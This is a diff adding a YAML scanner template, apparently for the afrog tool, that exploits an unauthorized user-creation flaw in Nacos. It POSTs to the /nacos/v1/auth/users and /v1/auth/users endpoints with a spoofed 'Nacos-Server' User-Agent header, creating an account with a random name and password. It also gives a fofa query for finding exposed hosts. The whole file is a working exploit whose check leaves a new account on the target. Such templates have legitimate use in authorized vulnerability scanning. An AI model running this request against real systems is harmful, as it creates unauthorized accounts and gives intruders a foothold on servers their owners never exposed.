@@ -1,0 +1,28 @@
+expression: r0() || r1()
+id: nacos-create-user-unauthorized
+info:
+  author: zan8in
+  description: fofa app="NACOS"
+  name: Nacos Unauthorized Create User
+  severity: high
+  verified: true
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes("create user
+      ok!"))
+    request:
+      headers:
+        User-Agent: Nacos-Server
+      method: POST
+      path: /nacos/v1/auth/users?username={{r1}}&password={{r2}}
+  r1:
+    expression: response.status == 200 && response.body.bcontains(bytes("create user
+      ok!"))
+    request:
+      headers:
+        User-Agent: Nacos-Server
+      method: POST
+      path: /v1/auth/users?username={{r1}}&password={{r2}}
+set:
+  r1: randomLowercase(8)
+  r2: randomLowercase(8)
